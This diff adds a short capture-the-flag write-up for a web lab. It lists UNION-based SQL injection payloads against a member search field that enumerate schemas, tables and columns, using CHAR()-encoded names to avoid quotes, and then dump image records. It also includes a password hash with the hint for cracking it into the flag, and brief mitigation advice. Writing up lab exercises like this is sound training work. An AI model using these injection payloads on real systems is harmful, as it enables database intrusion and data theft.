@@ -1,0 +1,15 @@
+use SQL Injection && Cryptographic Failures
+Process:
+    - Go to SEARCH MEMBER BY ID
+    - 1 UNION SELECT null, schema_name FROM information_schema.schemata -- 
+    - 1 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema = CHAR(77,101,109,98,101,114,95,105,109,97,103,101,115) -- 
+    - 1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = CHAR(108,105,115,116,95,105,109,97,103,101,115) --
+    - 1 UNION SELECT title, comment FROM Member_images.list_images --
+    - If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+    - Get the flag
+
+
+Secure:
+    - Use prepare request for SQL
+    - Check that there is only data and not commands in input for SQL
+    - Use Cryptographic tools advance (bcrypt)
